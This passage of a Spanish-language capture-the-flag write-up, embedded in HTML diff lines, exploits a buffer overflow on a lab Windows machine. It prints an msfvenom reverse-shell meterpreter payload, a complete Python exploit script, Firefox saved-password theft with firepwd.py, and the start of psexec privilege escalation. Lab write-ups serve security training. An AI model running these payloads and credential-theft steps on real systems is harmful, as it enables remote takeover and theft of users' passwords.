+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><p>La prueba ha sido un éxito, por lo que ya puedo atacar la máquina objetivo.</p>
+<h2 id="explotación-de-la-máquina-objetivo">Explotación de la máquina objetivo</h2>
+<p>Genero un nuevo payload con el LHOST y LPORT apropiado. En este caso me decido por un puerto standar que no esté siendo usado, como es el 443.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>tun0 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> EXITFUNC<span style="color:#f92672">=</span>process -b <span style="color:#e6db74">&#34;\x00\xa0&#34;</span> -f c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">12</span> compatible encoders
+</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
+</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">1632</span> bytes
+</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbf\xf9\xc3\x28\xb4\xda\xc6\xd9\x74\x24\xf4\x5a\x33\xc9&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb1\x59\x31\x7a\x14\x03\x7a\x14\x83\xea\xfc\x1b\x36\xd4&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5c\x54\xb9\x25\x9d\x0a\x8b\xf7\x14\x2f\x8f\x7c\x74\x9f&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xdb\xd1\x75\x54\x89\xc1\x8a\xdd\x64\xcc\x1f\x53\x51\x21&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xdf\xa2\x61\xed\x23\xa5\x1d\xec\x77\x05\x1f\x3f\x8a\x44&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x58\x89\xe0\xa9\x34\x81\x59\x25\x32\xd7\x61\x44\x94\x8f&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x12\x06\x6c\xb5\xe5\xf2\xc0\xb4\x35\x71\x80\x96\x3e\xcd&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x29\x87\x41\x1e\xcc\xee\x36\x9c\xfe\x0f\xff\x57\x34\x7b&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x01\xb1\x04\xbb\xae\xfc\xa8\x36\xae\x39\x0e\xa9\xc5\x31&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6c\x54\xde\x82\x0e\x82\x6b\x14\xa8\x41\xcb\xf0\x48\x85&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x8a\x73\x46\x62\xd8\xdb\x4b\x75\x0d\x50\x77\xfe\xb0\xb6&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xf1\x44\x97\x12\x59\x1e\xb6\x03\x07\xf1\xc7\x53\xef\xae&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6d\x18\x02\xb8\x12\xe1\xdc\xc5\x4e\x75\x10\x08\x71\x85&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x3e\x1b\x02\xb7\xe1\xb7\x8c\xfb\x6a\x1e\x4a\x8a\x7d\xa1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x84\x34\xed\x5f\x25\x44\x27\xa4\x71\x14\x5f\x0d\xfa\xff&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x9f\xb2\x2f\x95\x95\x24\xda\x67\x98\x0c\xb2\x75\xdc\x7d&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x1f\xf0\x3a\x2d\xcf\x52\x93\x8e\xbf\x12\x43\x67\xaa\x9d&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbc\x97\xd5\x74\xd5\x32\x3a\x20\x8d\xaa\xa3\x69\x45\x4a&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x2b\xa4\x23\x4c\xa7\x4c\xd3\x03\x40\x25\xc7\x74\x37\xc5&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x17\x85\xd2\xc5\x7d\x81\x74\x92\xe9\x8b\xa1\xd4\xb5\x74&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x84\x67\xb1\x8b\x59\x51\xc9\xba\xcf\xdd\xa5\xc2\x1f\xdd&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x35\x95\x75\xdd\x5d\x41\x2e\x8e\x78\x8e\xfb\xa3\xd0\x1b&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x04\x95\x85\x8c\x6c\x1b\xf3\xfb\x32\xe4\xd6\x7f\x34\x1a&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xa4\x57\x9d\x72\x56\xe8\x1d\x82\x3c\xe8\x4d\xea\xcb\xc7&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x62\xda\x34\xc2\x2a\x72\xbe\x83\x99\xe3\xbf\x89\x7c\xbd&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xc0\x3e\xa5\x4e\xba\x4f\x5a\xaf\x3b\x46\x3f\xb0\x3b\x66&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x41\x8d\xed\x5f\x37\xd0\x2d\xe4\x48\x67\x13\x4d\xc3\x87&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x07\x8d\xc6&#34;</span>;
+</span></span></code></pre></div><p>Actualizo el script de python con el nuevo payload. Lanzo el exploit y compruebo que se ha obtenido una sesión de meterpreter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.223.27&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">141</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xC3\x14\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbf\xf9\xc3\x28\xb4\xda\xc6\xd9\x74\x24\xf4\x5a\x33\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\x59\x31\x7a\x14\x03\x7a\x14\x83\xea\xfc\x1b\x36\xd4</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5c\x54\xb9\x25\x9d\x0a\x8b\xf7\x14\x2f\x8f\x7c\x74\x9f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xd1\x75\x54\x89\xc1\x8a\xdd\x64\xcc\x1f\x53\x51\x21</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdf\xa2\x61\xed\x23\xa5\x1d\xec\x77\x05\x1f\x3f\x8a\x44</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x89\xe0\xa9\x34\x81\x59\x25\x32\xd7\x61\x44\x94\x8f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x12\x06\x6c\xb5\xe5\xf2\xc0\xb4\x35\x71\x80\x96\x3e\xcd</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x29\x87\x41\x1e\xcc\xee\x36\x9c\xfe\x0f\xff\x57\x34\x7b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\xb1\x04\xbb\xae\xfc\xa8\x36\xae\x39\x0e\xa9\xc5\x31</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6c\x54\xde\x82\x0e\x82\x6b\x14\xa8\x41\xcb\xf0\x48\x85</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8a\x73\x46\x62\xd8\xdb\x4b\x75\x0d\x50\x77\xfe\xb0\xb6</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf1\x44\x97\x12\x59\x1e\xb6\x03\x07\xf1\xc7\x53\xef\xae</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6d\x18\x02\xb8\x12\xe1\xdc\xc5\x4e\x75\x10\x08\x71\x85</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x1b\x02\xb7\xe1\xb7\x8c\xfb\x6a\x1e\x4a\x8a\x7d\xa1</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x84\x34\xed\x5f\x25\x44\x27\xa4\x71\x14\x5f\x0d\xfa\xff</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9f\xb2\x2f\x95\x95\x24\xda\x67\x98\x0c\xb2\x75\xdc\x7d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1f\xf0\x3a\x2d\xcf\x52\x93\x8e\xbf\x12\x43\x67\xaa\x9d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbc\x97\xd5\x74\xd5\x32\x3a\x20\x8d\xaa\xa3\x69\x45\x4a</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2b\xa4\x23\x4c\xa7\x4c\xd3\x03\x40\x25\xc7\x74\x37\xc5</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x85\xd2\xc5\x7d\x81\x74\x92\xe9\x8b\xa1\xd4\xb5\x74</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x84\x67\xb1\x8b\x59\x51\xc9\xba\xcf\xdd\xa5\xc2\x1f\xdd</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x35\x95\x75\xdd\x5d\x41\x2e\x8e\x78\x8e\xfb\xa3\xd0\x1b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\x95\x85\x8c\x6c\x1b\xf3\xfb\x32\xe4\xd6\x7f\x34\x1a</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa4\x57\x9d\x72\x56\xe8\x1d\x82\x3c\xe8\x4d\xea\xcb\xc7</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x62\xda\x34\xc2\x2a\x72\xbe\x83\x99\xe3\xbf\x89\x7c\xbd</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x3e\xa5\x4e\xba\x4f\x5a\xaf\x3b\x46\x3f\xb0\x3b\x66</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8d\xed\x5f\x37\xd0\x2d\xe4\x48\x67\x13\x4d\xc3\x87</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x07\x8d\xc6</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># s.recv(1024)</span>
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Con el acceso logrado, lo primero que hago es buscar el fichero user.txt. Lo encuentro sin probremas con el comando search -f user.*.txt</p>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<p>Ahora hay que encontrar una forma de escalar privilegios. Compruebo que el proceso en el que estoy no tiene privilegios de administrador, y no puedo migrar a otro proceso con privilegios de administrador. Pruego a ejecutar el comando getsystem, pero no funciona, necesito otra opción.</p>
+<p>Por suerte, al entrar en el objetivo, he visto un enlace directo a Firefox, algo que puedo aproevhar si obtengo los ficheros key3.db y logins.json. Para ello, ejecuto el comando search -f key.*.db y search -f logins.json. El fichero key3.db se encuentra en C:\Users\usuario\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release y el fichero logins.json se encuentra en C:\Users\usuario\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; cd C:<span style="color:#ae81ff">\\</span>Users<span style="color:#ae81ff">\\</span>natbat<span style="color:#ae81ff">\\</span>AppData<span style="color:#ae81ff">\\</span>Roaming<span style="color:#ae81ff">\\</span>Mozilla<span style="color:#ae81ff">\\</span>Firefox<span style="color:#ae81ff">\\</span>Profiles
+</span></span><span style="display:flex;"><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>atbat<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>ozilla<span style="color:#ae81ff">\F</span>irefox<span style="color:#ae81ff">\P</span>rofiles
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size   Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----   ----  -------------              ----
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">16384</span>  dir   2020-05-15 04:45:02 +0200  ljfn812a.default-release
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">0</span>      dir   2020-04-21 23:00:37 +0200  rajfzh3y.default
+</span></span></code></pre></div><p>Aunque no se puede leer el fichero key3.db, si que se puede leer el fichero logins.json. En este fichero se encuentran las credenciales de usuario y contraseña de Firefox. Para poder leer el fichero, lo descargo a mi equipo con el comando download. Una vez obtenidos, los paso a mi equipo y los analizo con el script de python firepwd.py. El script se puede encontrar en:</p>
+<p><a href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a></p>
+<p>La descargo y la ejecuto con python firepwd.py. El script me devuelve las credenciales de usuario y contraseña de Firefox.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cd firepwd
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>❯ ll
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss  <span style="color:#ae81ff">14</span> KB Sun Oct  <span style="color:#ae81ff">1</span> 23:15:43 <span style="color:#ae81ff">2023</span>  firepwd.py
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss <span style="color:#ae81ff">288</span> KB Sun Oct  <span style="color:#ae81ff">1</span> 23:16:43 <span style="color:#ae81ff">2023</span>  key4.db
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss  <span style="color:#ae81ff">18</span> KB Sun Oct  <span style="color:#ae81ff">1</span> 23:15:43 <span style="color:#ae81ff">2023</span>  LICENSE
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss <span style="color:#ae81ff">600</span> B  Sun Oct  <span style="color:#ae81ff">1</span> 23:17:35 <span style="color:#ae81ff">2023</span>  logins.json
+</span></span><span style="display:flex;"><span>drwxr-xr-x k3ss k3ss 4.0 KB Sun Oct  <span style="color:#ae81ff">1</span> 23:15:43 <span style="color:#ae81ff">2023</span>  mozilla_db
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss <span style="color:#ae81ff">120</span> KB Sun Oct  <span style="color:#ae81ff">1</span> 23:15:43 <span style="color:#ae81ff">2023</span>  mozilla_pbe.pdf
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss <span style="color:#ae81ff">183</span> KB Sun Oct  <span style="color:#ae81ff">1</span> 23:15:43 <span style="color:#ae81ff">2023</span>  mozilla_pbe.svg
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss 7.0 KB Sun Oct  <span style="color:#ae81ff">1</span> 23:15:43 <span style="color:#ae81ff">2023</span>  readme.md
+</span></span><span style="display:flex;"><span>.rw-r--r-- k3ss k3ss  <span style="color:#ae81ff">34</span> B  Sun Oct  <span style="color:#ae81ff">1</span> 23:15:43 <span style="color:#ae81ff">2023</span>  requirements.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python firepwd.py
+</span></span><span style="display:flex;"><span>globalSalt: b<span style="color:#e6db74">&#39;2d45b7ac4e42209a23235ecf825c018e0382291d&#39;</span>
+</span></span><span style="display:flex;"><span> SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>   SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+</span></span><span style="display:flex;"><span>     SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>       SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+</span></span><span style="display:flex;"><span>         SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>           OCTETSTRING b<span style="color:#e6db74">&#39;9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d&#39;</span>
+</span></span><span style="display:flex;"><span>           INTEGER b<span style="color:#e6db74">&#39;01&#39;</span>
+</span></span><span style="display:flex;"><span>           INTEGER b<span style="color:#e6db74">&#39;20&#39;</span>
+</span></span><span style="display:flex;"><span>           SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>       SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+</span></span><span style="display:flex;"><span>         OCTETSTRING b<span style="color:#e6db74">&#39;b0da1db2992a21a74e7946f23021&#39;</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>   OCTETSTRING b<span style="color:#e6db74">&#39;a713739460522b20433f7d0b49bfabdb&#39;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>clearText b<span style="color:#e6db74">&#39;70617373776f72642d636865636b0202&#39;</span>
+</span></span><span style="display:flex;"><span>password check? True
+</span></span><span style="display:flex;"><span> SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>   SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+</span></span><span style="display:flex;"><span>     SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>       SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+</span></span><span style="display:flex;"><span>         SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>           OCTETSTRING b<span style="color:#e6db74">&#39;f1f75a319f519506d39986e15fe90ade00280879f00ae1e036422f001afc6267&#39;</span>
+</span></span><span style="display:flex;"><span>           INTEGER b<span style="color:#e6db74">&#39;01&#39;</span>
+</span></span><span style="display:flex;"><span>           INTEGER b<span style="color:#e6db74">&#39;20&#39;</span>
+</span></span><span style="display:flex;"><span>           SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>       SEQUENCE <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+</span></span><span style="display:flex;"><span>         OCTETSTRING b<span style="color:#e6db74">&#39;dbd2424eabcf4be30180860055c8&#39;</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>   OCTETSTRING b<span style="color:#e6db74">&#39;22daf82df08cfd8aa7692b00721f870688749d57b09cb1965dde5c353589dd5d&#39;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>clearText b<span style="color:#e6db74">&#39;86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808&#39;</span>
+</span></span><span style="display:flex;"><span>decrypting login/password pairs
+</span></span><span style="display:flex;"><span>   https://creds.com:b<span style="color:#e6db74">&#39;mayor&#39;</span>,b<span style="color:#e6db74">&#39;8CL7O1N78MdrCIsV&#39;</span>
+</span></span></code></pre></div><p>El usuario es mayor y la contraseña es 8CL7O1N78MdrCIsV. Ahora puedo probar a ejecutar el comando getsystem. Para ello, me conecto a la máquina con el usuario mayor y la contraseña 8CL7O1N78MdrCIsV. Una vez dentro, ejecuto el comando getsystem y compruebo que se ha escalado privilegios.</p>
+<p>Para llevar a cabo este ataque, uso el exploit psexec de metasploit. Para ello, primero busco el exploit con el comando search psexec. Una vez encontrado, lo configuro con los parámetros necesarios y lo lanzo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; search psexec
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                         Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                         ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
